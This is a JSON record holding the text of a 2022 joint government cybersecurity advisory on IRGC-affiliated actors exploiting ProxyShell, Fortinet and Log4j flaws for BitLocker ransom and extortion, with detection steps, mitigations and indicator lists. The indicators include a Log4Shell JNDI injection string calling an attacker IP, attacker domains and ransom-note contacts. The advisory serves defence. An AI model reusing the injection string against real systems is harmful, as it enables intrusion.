{
  "markdown": " \n  \n  \n \n    \n \n  \nU.S. organizations: All organizations should report incidents and anomalous activity to CISA s 24/7 Operations \nCenter at report@cisa.gov  or (888) 282 -0870 and/or to the FBI via your local FBI field office  or the FBIs 24/7 \nCyWatch at (855) 292 -3937 or CyWatch@fbi.gov . When available, please include the following information \nregarding the incident: date, time, and location of the incident; type of activity; number of people affected; type \nof equipment used for the activity; the name of the submitting company or organization; and a designated p oint \nof contact. For NSA client requirements or general cybersecurity inquiries, contact \nCybersecurity_Requests@nsa.gov . Australian organizations:  Visit cyber.gov.au  or call 1300 292 371 (1300 \nCYBER 1) to report cybersecurity incidents and access alerts and advisories. Canadian organizations : Report \nincidents by emailing CCCS at contact@cyber.gc.ca . United Kingdom  organizations:  Report significant cyber \nsecurity incident s to ncsc.gov.uk/report -an-incident  (monitored 24 hours). \nThis document is marked TLP:WHITE. Disclosure is not limited. Sources may use TLP:WHITE when information \ncarries minimal or no foreseeable risk of misuse, in accordance with applicable rules and procedures for public \nrelease. Subject to standard copyright rules, TLP:WHITE information may be distributed without restri ction.  \nFor more information on the Traffic Light Protocol, see cisa.gov/tlp/ . \n \n TLP:WHITE  \n Co-authored by:  \nTLP: WHITE    Product ID: AA22 -257A  \n \n September 14, 2022  \nIranian Islamic Revolutionary Guard Corps -Affiliated \nCyber Actors Exploiting Vulnerabilities for Data Extortion \nand Disk Encryption for Ransom Operations   \nThis joint C ybersecurity Advisory  (CSA) is the result of an \nanalytic effort among the Federal Bureau of Investigation \n(FBI), the Cybersecurity and Infrastructure Security Agency (CISA), the National Security Agency  (NSA), U.S. Cyber \nCommand (USCC)  - Cyber National Mission Force (CNMF) , \nthe Department of the Treasury  (Treasury ), the Australian \nCyber Security Centre (ACSC), the Canadian Centre for \nCyber Security (CCCS), and the United Kingdoms National \nCyber Security Centre (NCS C) to highlight continued \nmalicious cyber activity by advanced persistent threat (APT) \nactors that the authoring agencies  assess are affiliated with \nthe Iranian Governments  Islamic Revolutionary Guard Corps (IRGC) . Note: T he IRGC is an Iranian \nGovernment agency tasked with defending the Iranian Regime from perceived internal and external threats. Hereafter, this advisory refers to all the coauthors of this advisory as \" the authoring \nagencies.\"  \nThis advisory  updates joint CSA \nIranian Government-Sponsored APT Cyber Actors Exploiting \nMicrosoft Exchange and Fortinet Vulnerabilities in Furtherance of Malicious Activities , w hich provides Actions to take today to protect \nagainst ransom  operations: \n Keep systems and software updated and prioritize \nremediating \nknown exploited \nvulnerabilities . \n Enforce MFA. \n Make offline  backups of your \ndata. \n\n \n \n \n   TLP:WHITE  \n \nPage 2 of 15  |  Product ID: AA 22-257A  TLP: WHITE    information on these Iranian government-sponsored APT actors exploiting  known Fortinet and \nMicrosoft Exchange vulnerabilities to gain initial access to a broad range of targeted entities in \nfurtherance of malicious activities, including ransom operations . The authoring agencies  now j udge \nthese actors are an APT group affiliated with the IRGC .  \nSince the initial reporting of this activity in the FBI Liaison Alert System (FLASH) report APT Actors \nExploiting Fortinet Vulnerabilities to Gain Access for Malicious Activity  fr om May 2021, the authoring \nagencies  have continued to observe  these IRGC -affiliated actors  exploiting  known vulnerabilities for \ninitial access. In addition to exploiting Fortinet and Microsoft Exchange vulnerabilities, the authoring \nagencies  have observed these APT actors exploiting VMware  Horizon Log4j  vulnerabilities for initial \naccess.  The IRGC -affiliated actors have used this access for follow -on activity , including disk \nencryption and data extorti on, to support ransom operations.  \nThe IRGC -affiliated actors  are actively targeting a broad range of entitie s, including entities  across \nmultiple U.S. critical infrastructure sectors  as well as Australian, Canadian, and United Kingdom  \norganizations. These actors often operate under the auspices of Najee Technology Hooshmand Fater \nLLC, based in Karaj, Iran, and Afkar System Yazd Company , based in Yazd, Iran. The authoring \nagencies  assess the actors are exploiting known vulnerabilities on unprotected networks rather than \ntargeting specific targeted entities or sectors . \nThis advisory provides observed tactics , techniques  and indicators of compromise (IOCs) , that the \nauthoring agencies  assess are likely associated with this IRGC -affiliated APT. The authoring \nagencies  urge organizations, especially critical infrastructure organizations , to apply  the \nrecommendations  listed in the Mitigations section of this advisory to mitigate risk of compromise from \nthese IRGC - affiliated cyber actors.  \nFor a downloadable copy of IOCs, see AA22-257A.stix . \nFor more information on Iranian state -sponsored malicious cyber activity, see CISAs Iran Cyber \nThreat Overview and Advisories  webpage and the FBIs Iran Threat  webpage.  \nTECHNICAL DETAILS   \nThreat Actor Activity  \nAs reported in joint CSA Iranian Government-Sponsored APT Cyber Actors Exploiting Microsoft \nExchange and Fortinet Vulnerabilities in Furtherance of Malicious Activities , the authoring agencies  \nhave observed Iranian government-sponsored APT actors scanning for and/or exploiting the following \nknown Fortinet FortiOS and Microsoft Exchange server vulnerabilities since early 2021 to gain initial \naccess to a broad range of targeted entities : CVE-2018-13379, CVE-2020-12812, CVE-2019-5591 , \nand CVE-2021-34473  (a ProxyShell vulnerability). The authoring agencies  have also observed these \nAPT actors leveraging CVE -2021-34473 against U.S. networks in combination with ProxyShell \nvulnerabilities CVE-2021-34523 and CVE-2021-31207 . The NCSC judges that Yazd, Iran-based \ncompany Afkar System Y azd Company is actively targeting UK organizations. Additionally, ACSC \njudges  that these APT actors  have  used  CVE-2021-34473 in Australia to gain access to systems. The \n\n \n \n \n   TLP:WHITE  \n \nPage 3 of 15  |  Product ID: AA 22-257A  TLP: WHITE    APT actors can leverage this access for further malicious activities, including deployment of tools to \nsupport ransom and extortion operations , and data exfiltration .  \nSince the activity was reported in 2021, these IRGC -affiliated actors  have continued t o exploit known \nvulnerabilities for initial access. In addition to exploiting Fortinet and Microsoft Exchange \nvulnerabilities, the authoring agencies  have observed these APT actors exploiting VMware  Horizon \nLog4j  vulnerabilities CVE-2021-44228 (Log4Shell), CVE-2021-45046, and CVE-2021-45105  for \ninitial access . \nThe IRGC -affiliated actors have used  their access for ransom  operations , including disk encryption \nand extortion efforts. After gaining access to a network, the IRGC -affiliated actors likely  determine a \ncourse of action based on their perceived value of the data. Depending on the perceived value, the \nactors may encrypt data for ransom and/or exfiltrate data. The actors  may sell the data or use the \nexfiltrated data in extortion operations or d ouble extortion ransom operations  where a threat actor \nuses a combination of encryption and data theft to pressure targeted entities to pay ransom demands .  \nIRGC -affiliated actor activity observed by the authoring agencies  includes :  \n In December 2021, the actors  exploited ProxyShell vulnerabilities (likely CVE-2021-34473, \nCVE-2021-34523, and CVE -2021-31207) o n a Microsoft Exchange server to gain access to \nthe network of a U.S. police department. The actors used their access to move laterally within \nthe network, encrypt network devices  with BitLocker, and hold the decryption keys for ransom.  \n In December 2021, the actors exploited ProxyShell vulnerabilities  (likely CVE-2021-34473, \nCVE-2021-34523, and CVE -2021-31207), o n a Microsoft Exchange server to gain access to \nthe network of a U.S. regional transportation company. The actors used their access to move \nlaterally within the network, encrypt network devices  with BitLocker, and hold the decryption \nkeys for ransom. This activity disrupted the transportation companys operations for an extended period. \n In February 2022, the actors  exploited a Log4j vulnerability  (likely CVE -2021-44228, CVE-\n2021-45046, and/or  CVE-2021-45105) in a VM ware Horizon application to gain access to the \nnetwork of a U.S. municipal government, move laterally within the network, establish \npersistent access, initiate crypto-mining operations , and conduct additional malicious activity.  \n In February 2022, the actors  may have exploited a Log4j vulnerability  (likely CVE-2021-44228, \nCVE-2021-45046, and/or  CVE-2021) to gain access to the network of a U.S. aerospace \ncompany . The actors l everaged a server that the authoring agencies  assess is associated with \nthe IRGC -affiliated actors  to exfiltrate data from the company's network.   \nMITRE ATT&CK  Tactics and Techniques  \nNote : This advisory uses the MITRE ATT&CK for Enterprise  framework, version 11. See Appendix B  \nfor a table of the MITRE ATT&CK tactics and techniques observed. \nThe authoring agencies assess  the following tactics and techniques are associated with this activity.   \n \n\n \n \n \n   TLP:WHITE  \n \nPage 4 of 15  |  Product ID: AA 22-257A  TLP: WHITE    Resource Development [ TA0042 ] \nThe IRGC -affiliated actors have used the following malicious and legitimate tools [T1588.001 , \nT1588.002 ] for a variety  of tactics across the enterprise spectrum : \n Fast Reverse Proxy (FRP) for command and control (C2)  \n Plink for C2 \n Remote Desktop Protocol (RDP) for lateral movement  \n BitLocker for data encryption \n SoftPerfect Network Scanner for system network configuration discovery  \n \nNote : For additional tools used by these IRGC -affiliated cyber actors, see joint CSA Iranian \nGovernment -Sponsored APT Cyber Actors Exploiting Microsoft Exchange and Fortinet Vulnerabilities \nin Furtherance of Malicious Activities . \nInitial Access [TA0001 ] \nAs stated in the Technical Details section previously reported in joint CSA Iranian Government-\nSponsored APT Cyber Actors Exploiting Microsoft Exchange and Fortinet Vulnerabilities in \nFurtherance of Malicious Activities , the I RGC -affiliated actor s gained initial access by exploiting  \nknown vulnerabilities [ T1190 ].  \nThe following IOCs, observed as of March 2022, are indicative of ProxyShell vulnerability exploitation \non targeted entity networks:  \n W eb shells with naming conventions aspx_[11 randomly generated alphabetic \ncharacters].aspx, login.aspx , or default.aspx in any of the following directories:  \no C:\\Program Files\\ Microsoft\\ Exchange \nServer\\V15\\FrontEnd\\ HttpProxy\\ ecp\\auth\\    \no C:\\Program Files\\ Microsoft\\ Exchange \nServer\\V15\\FrontEnd\\ HttpProxy\\ owa\\auth\\    \no C:\\inetpub\\wwwroot\\ aspnet_client\\    \nThe following IOCs, observed as of December 2021, are indicative of Log4j vulnerability exploitation on targeted entity networks:  \n ${jdni:ldap//148.251.71.182:1389/RCE} (user agent string)  \n RCE.class  \nExecution [ TA0002 ] \nThe IRGC -affiliated actor s may have made modifications to the Task Scheduler [T1053.005 ]. These \nmodificati ons may display as unrecognized scheduled tasks or actions. Specifically, the below \nestablished tasks may be associated with this activity:  \n Wininet \n Wininet  \n WinLogon  \n\n \n \n \n   TLP:WHITE  \n \nPage 5 of 15  |  Product ID: AA 22-257A  TLP: WHITE     CacheTask  \nNote: The potential exists that tasks associated with CacheTask or Wininet may be legitimate. F or \nadditional tasks used by these IRGC -affiliated cyber actors, see joint CSA Iranian Government-\nSponsored APT Cyber Actors Exploiting Microsoft Exchange and Fortinet Vulnerabilities in \nFurtherance of Malicious Activities .   \nPersistence  [TA0003 ] \nThe IRGC -affiliated actor s established new user accounts on domain controllers, servers, \nworkstations, and active directories [ T1136.001, T1136.002 ]. The actors enabled a built-in Windows \naccount (DefaultAccount) and escalated privileges to gain administrator -level access to a network. \nSome of these accounts appear to have been created to look similar to other existing accounts on the \nnetwork, so specific account names may vary per organization. In addition to unrecognized user \naccounts or accounts established to masquerade as existing accounts, the following account \nusernames may be associated with this activity:  \n Domain Admin \n it_admin  \n DefaultAccount  \n Default01  \nNote : For additional account usernames associated with this activity, see joint CSA Iranian \nGovernment -Sponsored APT Cyber Actors Exploiting Microsoft Exchange and Fortinet Vulnerabilities \nin Furtherance of Malicious Activities . \nExfiltration [ TA0010 ] \nThe authoring agencies have observed the IRGC -affiliated actors dumping and subsequently \nexfiltrating the Local Security Authority Subsystem Service (LSASS) process memory on targeted \nentity networks in furtherance of credential harvesting. The following IOCs are associated with data \nexfiltration from targeted entity networks:  \n C:\\Windows\\Temp\\sassl[.]pmd  \n C:\\Windows\\Temp\\ssasl[.]zip   \n C:\\Users\\DefaultAccount\\ AppData\\ Local\\Temp\\lsass[.]dmp  \n C:\\Users\\DefaultAccount\\ AppData\\ Local\\Temp\\lsass[.]zip  \n \nImpact [TA0040 ] \nThe IRGC -affiliated actor s forced BitLocker activation on host networks to encrypt data [ T1486 ] and \nheld the decryption keys for ransom. The c orresponding ransom notes were sent to the targeted \nentity, left on the targeted entity  network as a .txt file or printed on the targeted entitys networked \nprinter(s). The notes included the following contact information:  \n @BuySafety  (Telegram)  \n @WeRBits (Telegram)  \n\n \n \n \n   TLP:WHITE  \n \nPage 6 of 15  |  Product ID: AA 22-257A  TLP: WHITE     +93794415076 (Telegram)  \n +93794415076 (WhatsApp)  \n werbits@onionmail[.]org  \n buysafety@onionmail[.]org  \n yacashcash@rambler[.]ru  \nNote : For additional contact information included in ransom notes, see joint CSA Iranian \nGovernment -Sponsored APT Cyber Actors Exploiting Microsoft Exchange and Fortinet Vulnerabilities \nin Furtherance of Malicious Activities . \nDETECTION \nThe authoring agencies  recommend  that organizations using Microsoft Exchange servers , Fortinet \ndevices , and/or VMware Horizon applications  investigate potential suspicious activity in their \nnetworks.  \n Search for IOCs. Collect known-bad IOCs and search for them in network and host artifacts. \nNote : Refer to Appendix A for IOCs.  \n Review Log4j vulnerabilities, including CVE -2021 -44228, CVE-2021-45046, and CVE -2021- \n45105. \n Review Microsoft Exchange ProxyShell vulnerabilities, including CVE -2021-34473, CVE -2021-\n34523, and CVE -2021-31207. \n As a precaution, review additional Microsoft Exchange vulnerabilities, including CVE-2021-\n31196, CVE -2021-31206, CVE -2021-33768, CVE -2021-33766, and CVE -2021-34470 \nbecause the authoring agencies have seen the actors broadly target Microsoft Exchange \nservers. \n Investigate exposed Microsoft Exchange servers , both patched and unpatched, for \ncompromise .  \n Review Fortinet FortiOS vulnerabilities, including CVE -2018-13379, CVE -2020-12812, and \nCVE-2019-5591. \n Review VMware vulnerabilities, including any relevant vulnerabilities listed on the VMware \nsecurity advisory page.  \n Investigate changes to RDP, fi rewall, and Windows Remote Management (WinRM) \nconfigurations that may allow malicious cyber actors to maintain persistent access.  \n Review domain controllers, servers, workstations, and active director ies for new or \nunrecognized user accounts . \n Review Task Scheduler for unrecognized scheduled tasks. Additionally, manually review operating-system and scheduled tasks including each step these tasks perform for \nunrecognized actions . \n Review antivirus logs for indications they were unexpectedly turned off. \n Look for WinRAR and FileZilla in unexpected locations.  \n\n \n \n \n   TLP:WHITE  \n \nPage 7 of 15  |  Product ID: AA 22-257A  TLP: WHITE     Review servers and workstations for malicious executable files masquerading as legitimate \nWindows processes. Malicious files may not be found in the expected directory and may have \ncmd.exe or powershell.exe as their parent process.  \nNote : For additional approaches on uncovering malicious cyber activity, see joint advisory Technical \nApproaches to Uncovering and Remediating Malicious Activity , authored by CISA and the \ncybersecurity authorities of Australia, Canada, New Zealand, and the United Kingdom.  \nMITIGATION S \nThe authoring agencies urge network defenders to prepare for and mitigate potential cyber threats \nimmediately by implementing the mitigations below. \nImplement and Enforce Backup and Restoration Policies and Procedures  \n Maintain offline (i.e., physically disconnected) backups of data, and regularly test backup and restoration. These practices safeguard an organizations continuity of \noperations or at least minimize potential downtime from a ransomware or other destructive \ndata incident and protect against data losses.  \no Ensure all backup data is encrypted, immutable (i.e., cannot be altered or deleted), \nand covers the entire organizations data infrastructure. \n Activate BitLocker on all networks and securely back up BitLocker keys with Microsoft and \nwith an independent offline backup.  \n Create, maintain, and exercise a basic cyber incident response plan that includes response procedures for a ransom incident.  \n Implement a recovery plan to maintain and retain multiple copies of sensitive or proprietary \ndata and servers in a physically separate, segmented, secure location (e.g., hard drive, storage device, the cloud). \nPatch and Update Systems  \n U.S. f ederal, state, local, tribal , and territorial (SLTT) government and critical infrastructure \norganization  organizations: Implement free CISA Cyber Hygiene Services Vulnerability \nScanning  to enable continuous scans of public, static IPs for accessible services and \nvulnerabilities. \n Install updates/patch operating systems, software, and firmware as soon as updates/patches are released. Regularly check software updates and end-of-life notifications. Consider \nleveraging a centralized patch management system to automate and expedite the process.  \n Immediately patch software affected by vulnerabilities identified in this advisory: CVE -2021-\n34473, CVE -2018-13379, CVE -2020-12812, CVE-2019-5591, CVE-2021-34523, CVE -2021-\n31207, CVE -2021-44228, CVE -2021-45046, CVE -2021-45105, CVE-2021-31196, CVE -2021-\n31206, CVE -2021-33768, CVE -2021-33766, and CVE -2021-34470. \nEvaluate and Update Blocklists and Allowlists  \n\n \n \n \n   TLP:WHITE  \n \nPage 8 of 15  |  Product ID: AA 22-257A  TLP: WHITE     Regularly evaluate and update blocklists and allowlists. \n If FortiOS is not used by your organization, add the key artifact files used by FortiOS to your \norganization s execution blocklist . Prevent an y attempts to install or run this program and its \nassociated files.  \nImplement Network S egmentation  \n Implement network segmentation to restrict a malicious threat actors lateral movement.  \nSecure User Accounts  \n Audit user accounts with administrative privileges and configure access controls under the principles of least privilege and separation of duties.  \n Require administrator credentials to install software.  \nImplement Multif actor Authentication  \n Use multifactor authentication where possibl e, particularly for webmail, virtual private networks \n(VPNs), accounts that access critical systems, and privileged accounts that manage backups .  \nUse Strong Passwords  \n Require all accounts with password logins to have strong, unique passwords. See CISA Tip \nChoosing and Protecting Passwords  and National Institute of Standards and Technology \n(NIST) Special Publication 800-63B: Digital Identity Guidelines  for more information. \nSecure and Monitor RDP and other Potentially Risky Services \n If you use RDP , restrict it to limit access to resources over internal networks. After assessing \nrisks, if your organization deems RDP operationally necessary, restrict the originating sources, \nand require MFA to mitigate credential theft and reuse. If RDP must be available externally, use a VPN, virtual desktop infrastructure, or other means to authenticate and secure the \nconnection before allowing RDP to connect to internal devices. \n Disable unused remote access/RDP ports.  \n Monitor remote access/RDP logs, enforce account lockouts after a specified number of \nattempts (to block brute force campaigns), and log RDP login attempts .  \nUse Antivir us Programs \n Install and regularly update antivirus and anti -malware software on all hosts.  \nSecure Remote Access  \n Only use secure networks.  \n Consider installing and using a VPN  for remote access.  \n\n \n \n \n   TLP:WHITE  \n \nPage 9 of 15  |  Product ID: AA 22-257A  TLP: WHITE    VALIDATE SECURITY CONTROLS  \nIn addition to applying mitigations, the authoring agencies  recommend exercis ing, testing, and \nvalidating your organization's  security program against the threat behaviors mapped to the MITRE \nATT&CK for Enterprise framework  in this advisory. The authoring agencies recommend testing your \nexisting security controls inventory to assess  how they perform against the ATT&CK techniques \ndescribed in this advisory.  \nTo get started: \n1. Select an ATT&CK technique described in this advisory (see Appendix B ). \n2. Align your security technologies against the technique.  \n3. Test your technologies against the technique.  \n4. Analyze your detection and prevention technologies performance. \n5. Repeat the process for all security technologies to obtain a set of comprehensive performance \ndata. \n6. Tune your security program, including people, processes, and technologies, based on the data generated by this process.  \nThe authoring agencies recommend continually tes ting your security program, at scale, in a \nproduction environment to ensure optimal performance against the MITRE ATT&CK techniques \nidentified in this advisory. \nRESPONDING TO RANSOMWARE  OR EXTORTION  INCIDENTS  \nIf a ransomware or extortion incident occurs at your organization: \n Follow the Ransomware Response Checklist on p age 11 of the CISA -Multi -State Information \nSharing and Analysis Center (MS -ISAC) Joint Ransomware Guide . \n Scan backups. If possible, scan backup data with an antivirus program to check that it is free \nof malware. This should be performed using an isolated, trusted system to avoid exposing \nbackups to potential compromise.  \n Follow the notification requirements as outlined in your cyber incident response plan.  \no U.S. organizations: Report incidents to the FBI at a local FBI Field Office  or the FBI \n24/7 CyWatch at (855)292-3937 or cywatch@fbi.gov, CISAs 24/7 Operations Center at \nreport@cisa.gov  or (888) 282-0870, or the U.S. Secret Service (USSS) at a USSS Field \nOffice. \no Australian organizations: Visit  cyber.gov.au  or call 1300 292 371 (1300 CYBER 1) to \nreport cybersecurity incidents and access alerts and advisories. \no Canadian organizations: R eport incidents by emailing CCCS at contact@cyber.gc.ca .  \no United Kingdom organizations: R eport a significant cyber security \nincident: ncsc.gov.uk/report-an-incident  (monitored 24 hours)  \n Apply incident response best practices found in the joint Cybersecurity Advisory, Technical \nApproaches to Uncovering and Remediating Malicious Activity , developed by CISA and the \ncybersecurity authorities of Australia, Canada, New Zealand, and the United Kingdom.  \n\n \n \n \n   TLP:WHITE  \n \nPage 10 of 15  |  Product ID: AA22- 257A  TLP: WHITE    Note:  The authoring agencies strongly discourage paying ransoms as doing so does not guarantee \nfiles and records will be recovered and may pose sanctions risks.  \nRESOURCES \n The U.S. Department of States Rewards for Justice (RFJ) program offers a reward of up to \n$10 million for reports of foreign government malicious activity against U.S. critical \ninfrastructure. See the RFJ  website for more information and how to report information \nsecurely.  \n For more information on malicious cyber activity affiliated with the Iranian  government-\nsponsored malicious cyber activity, see us-cert.cisa.gov/Iran and FBIs Iran Threat  page. \n For information and resources on protecting against and responding to ransomware or \nextortion activity, refer to  StopRansomware.gov , the U .S. centralized, whole-of-government \nwebpage providing ransomware resources and alerts.  \n The joint advisory from the cybersecurity authorities of Australia, Canada, New Zealand, the United Kingdom, and the United States : \nTechnical Approaches to Uncovering and \nRemediating Malicious Activity  pr ovides additional guidance when hunting or investigating a \nnetwork and common mistakes to avoid in incident handling. \n CISA offers a range of no-cost  cyber hygiene services  to help critical infrastructure \norganizations assess, identify, and reduce their exposure to threats. By requesting these \nservices, organizations of any size could find ways to reduce their risk and mitigate malicious \nactivity . \n ACSC can provide tailored cyber security advice and assistance, reporting, and inc ident \nresponse support at cyber.gov.au  and via 1300 292 371 (1300 CYBER1). \nPURPOSE  \nThis advisory was developed by U.S., Australian, Canadian, and UK cybersecurity authorities in \nfurtherance of their respective cybersecurity missions, including their responsibilities to develop and \nissue cybersecurity specifications and mitigations. \nDISCLAIMER  \nThe information in this report is being provided as is for informational purposes only. FBI, CISA, \nNSA, USCC , DoT, ACSC, CCCS, and NCSC do not endorse any commercial product or service, \nincluding any subjects of analysis. Any reference to specific commercial products, processes, or services by service mark, trademark, manufacturer, or otherwise, does not constitute or imply \nendorsement, recommendation, or favoring.   \n\n \n \n \n   TLP:WHITE  \n \nPage 11 of 15  |  Product ID: AA22- 257A  TLP: WHITE    APPENDIX A: INDICATORS OF COMPROMISE   \nIP addresses and executables files are listed be low. For a downloadable copy of IOCs, see AA22-\n257A.stix . \nIP Addresses  \n 54.39.78[.]148  \n 95.217.193[.]86  \n 104.168.117[.]149  \n 107.173.231[.]114  \n 144.76.186[.]88  \n 148.251.71[.]182  \n 172.245.26[.]118  \n 185.141.212[.] 131 \n 198.12.65[.] 175 \n 198.144.189[.]74  \nNote : Some of these observed IP addresses may be outdated. T he authoring agencies recommend \norganizations investigate or vet these IP addresses prior to taking action, such as blocking.  \nMalicious Domains  \n newdesk[.]top \n symantecserver[.] co \n msupdate[.] us \n msupdate[.]top  \n gupdate[.]us \n aptmirror[.]eu \n buylap[.]top \n winstore[.]us  \n tcp443[.]org \n mssync[.]one \n upmirror[.]top  \n tcp443 (subdomain)  \n kcp53 (subdomain)  \nFiles   \nMalicious  files observed in this activity are identified in Table 1. Many of the below malicious files are \nmasquerading as legitimate Windows files ; therefore, file names alone should not be treated as an \nindicator of compromise. Note : For additional malicious files observed, see joint CSA Iranian \nGovernment -Sponsored APT Cyber Actors Exploiting Microsoft Exchange and Fortinet Vulnerabilities \nin Furtherance of Malicious Activities . \n\n \n \n \n   TLP:WHITE  \n \nPage 12 of 15  |  Product ID: AA22- 257A  TLP: WHITE    Table 1: Malicious Files  \nFilename:  Wininet [.]xml \nPath:  C:\\Windows \\Temp \\wininet [.]xml \nMD5:  d2f4647a3749d30a35d5a8faff41765e  \nSHA-1: 0f676bc786db3c44cac4d2d22070fb514b4cb64c  \nSHA-256: 559d4abe3a6f6c93fc9eae24672a49781af140c43d491a757c8e975507b4032e  \nFilename:  Wininet [.]xml \nMD5:  2e1e17a443dc713f13f45a9646fc2179  \nSHA-1: e75bfc0dd779d9d8ac02798b090989c2f95850dc  \nFilename:  WinLogon [.]xml \nPath:  C:\\Windows \\Temp \\WinLogon [.]xml \nMD5:  49c71178fa212012d710f11a0e6d1a30  \nSHA-1: 226f0fbb80f7a061947c982ccf33ad65ac03280f  \nSHA-256: bcc2e4d96e7418a85509382df6609ec9a53b3805effb7ddaed093bdaf949b6ea  \nFilename:  Wininet [.]bat \nPath:  C:\\Windows \\wininet [.]bat \nMD5:  5f098b55f94f5a448ca28904a57c0e58  \nSHA-1: 27102b416ef5df186bd8b35190c2a4cc4e2fbf37  \nSHA-256: 668ec78916bab79e707dc99fdecfa10f3c87ee36d4dee6e3502d1f5663a428a0  \nFilename:  Winlogon [.]bat \nPath:  C:\\Windows \\winlogon [.]bat \nMD5:  7ac4633bf064ebba9666581b776c548f  \nSHA-1: 524443dd226173d8ba458133b0a4084a172393ef  \nSHA-256: d14d546070afda086a1c7166eaafd9347a15a32e6be6d5d029064bfa9ecdede7  \nFilename:  CacheT ask[.]bat \nPath:  C:\\\\ProgramData \\Microsoft \\CacheTask [.]bat \nMD5:  ee8fd6c565254fe55a104e67cf33eaea  \nSHA-1: 24ed561a1ddbecd170acf1797723e5d3c51c2f5d  \nSHA-256: c1723fcad56a7f18562d14ff7a1f030191ad61cd4c44ea2b04ad57a7eb5e2837  \n\n \n \n \n   TLP:WHITE  \n \nPage 13 of 15  |  Product ID: AA22- 257A  TLP: WHITE    Filename:  Task_update[.]exe  \nPath:  C:\\Windows \\Temp \\task_update [.]exe \nMD5:  cacb64bdf648444e66c82f5ce61caf4b  \nSHA-1: 3a6431169073d61748829c31a9da29123dd61da8  \nSHA-256: 12c6da07da24edba13650cd324b2ad04d0a0526bb4e853dee03c094075ff6d1a  \nFilename:  Task[.]exe \nMD5:  5b646edb1deb6396082b214a1d93691b  \nSHA-1: 763ca462b2e9821697e63aa48a1734b10d3765ee  \nSHA-256: 17e95ecc7fedcf03c4a5e97317cfac166b337288562db0095ccd24243a93592f  \nFilename:  dllhost[ .]exe \nPath:  C:\\Windows \\dllhost [.]exe \nMD5:  0f8b592126cc2be0e9967d21c40806bc  9a3703f9c532ae2ec3025840fa449d4e  \n \nSHA-1: 3da45558d8098eb41ed7db5115af5a2c6\n1c543af  8ece87086e8b5aba0d1cc4ec3804bf74e\n0b45bee \nSHA-256:  724d54971c0bba8ff32aeb6044d3b3fd57\n1b13a4c19cada015ea4bcab30cae26  1604e69d17c0f26182a3e3ff65694a4945\n0aafd56a7e8b21697a932409dfd81e \nFilename:  svchost [.]exe \nPath:  C:\\Windows \\svchost [.]exe \nMD5:  68f58e442fba50b02130eedfc5fe4e5b  298d41f01009c6d6240bc2dc7b769205  \nSHA-1: 76dd65607 82b13af3f44286483e157848\nefc0a4e  6ca62f4244994b5fbb8a46bdfe62aa1c95\n8cebbd  \nSHA-256: b04b97e7431925097b3ca4841b894139\n7b0b88796da512986327ff66426544ca 8aa3530540ba023fb29550643beb00c9c\n29f81780056e02c5a0d02a1797b9cd9 \nFilename:  User[.]exe  \nPath:  C:\\Windows \\Temp \\user[.]exe \nMD5:  bd131ebfc44025a708575587afeebbf3  f0be699c8aafc41b25a8fc0974cc4582  \nSHA-1: 8b23b14d8ec4712734a5f6261aed40942\nc9e0f68  6bae2d45bbd8c4b0a59ba08892692fe86\ne596154 \nSHA-256: b8a472f219658a28556bab4d6d109fdf3\n433b5233a765084c70214c973becbbd 7b5fbbd90eab5bee6f3c25aa3c2762104\ne219f96501ad6a4463e25e6001eb00b \n\n \n \n \n   TLP:WHITE  \n \nPage 14 of 15  |  Product ID: AA22- 257A  TLP: WHITE    Filename:  Setup [.]bat \nPath:  C:\\Users \\DefaultAccount \\Desktop \\New folder \\setup [.]bat \nMD5:  7fdc2d007ef0c1946f1f637b87f81590  \nFilename:  Ssasl[.]pmd  \nPath:  C:\\Windows \\Temp \\ssasl[.]pmd  \nFilename:  Ssasl[.]zip \nPath:  C:\\Windows \\Temp \\ssasl[.]zip  \nFilename:  netscanold[ .]exe \nPath:  C:\\Users \\DefaultAccount \\Desktop \\netscanold \\netscanold [.]exe \nFilename:  scan[ .]csv \nPath:  C:\\Users \\DefaultAccount \\Desktop \\scan [.]csv \nFilename:  lsass [.]dmp  \nPath:  C:\\Users \\DefaultAccount \\AppData \\Local \\Temp \\lsass [.]dmp \nFilename:  lsass[ .]zip \nPath:  C:\\Users \\DefaultAccount \\AppData \\Local \\Temp \\lsass [.]zip \n \n \n  \n\n \n \n \n   TLP:WHITE  \n \nPage 15 of 15  |  Product ID: AA22- 257A  TLP: WHITE    APPENDIX B: MITRE ATT&CK TACTICS AND TECHNIQUES   \nTable 2 identifies MITRE ATT&CK Tactics and techniques observed in this activity.  \nTable 2: Observed Tactics and Techniques  \nTactic  Technique  \nResource Development ]TA0042 ] \n Obtain Capabilities:  Malware  [T1588.001 ] \nObtain Capabilities:  Tool [T1588.002 ] \nInitial Access [ TA0001 ] Exploit Public -Facing Application  [T1190 ] \nExecu tion [ TA0002 ] Scheduled Task/Job:  Scheduled Task [T1053.005 ] \nPersistence [ TA0003 ] Create Account:  Loca l Account [T1136.001 ] \nCreate Account:  Domain Account [T1136.002 ] \nPrivilege  Escalation [ TA0004 ]  \nCred ential Access [ TA0006 ]  \nCollection  [TA0009 ] Archive Collected Data: Archive via Utility [ T1560.001 ] \nExfiltration [ TA0010 ]  \nImpact  [TA0040 ] Data Encrypted for Impact  [T1486 ] \n \n \n\n",
  "cves": [
    "CVE-2021-45105",
    "CVE-2021-34523",
    "CVE-2021-34473",
    "CVE-2021-44228",
    "CVE-2021-45046",
    "CVE-2018-13379",
    "CVE-2021-31207",
    "CVE-2019-5591",
    "CVE-2021-31196",
    "CVE-2020-12812"
  ],
  "techniques": [
    "T1136.002",
    "T1588.002",
    "T1053.005",
    "T1136.001",
    "T1560.001",
    "T1588.001"
  ],
  "advisory": "cybersecurity-alerts",
  "title": "csa_irgc",
  "source": "nsa",
  "id": "c0d6b569bf913641db8b189d9a6731e8f653e12fd4cdbc660cdfa709ee183072"
}